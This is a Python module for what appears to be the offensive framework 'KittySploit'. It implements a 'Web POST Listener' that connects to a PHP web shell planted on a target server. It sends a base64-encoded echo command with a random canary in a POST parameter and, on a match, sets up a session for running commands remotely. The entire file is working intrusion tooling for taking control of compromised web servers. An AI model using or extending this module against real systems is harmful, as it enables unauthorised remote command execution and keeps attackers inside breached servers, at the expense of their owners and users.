from kittysploit import *
from lib.protocols.http.http_client import Http_client
from base64 import b64encode

class Module(Listener, Http_client):

	__info__ = {
		'name': 'Web POST Listener',
		'description': 'Web POST Listener (payload in POST body)',
		'author': 'KittySploit Team',
		'arch': Arch.PHP,
		'handler': Handler.BIND,
		'session_type': SessionType.PHP,
	}

	param_name = OptString("cmd", "POST parameter name for connect", True)
	uripath = OptString("/", "HTTP path", True)

	def run(self):
		canary = self.random_text(10)
		data = f"echo '{canary}';".encode('utf-8')
		post_data = {self.param_name: b64encode(data).decode('utf-8')}
		r = self.http_request(
			method='POST',
			path=self.uripath,
			data=post_data,
			session=True
		)
		if canary in r.content.decode('utf-8'):
			print_success("Connection established")
			additional_data = {
				'uripath': self.uripath,
				'param_name': self.param_name,
				'method': 'POST'
			}
			return (self.session, self.target, int(self.port), additional_data)

		print_error("Connection failed")
		return False
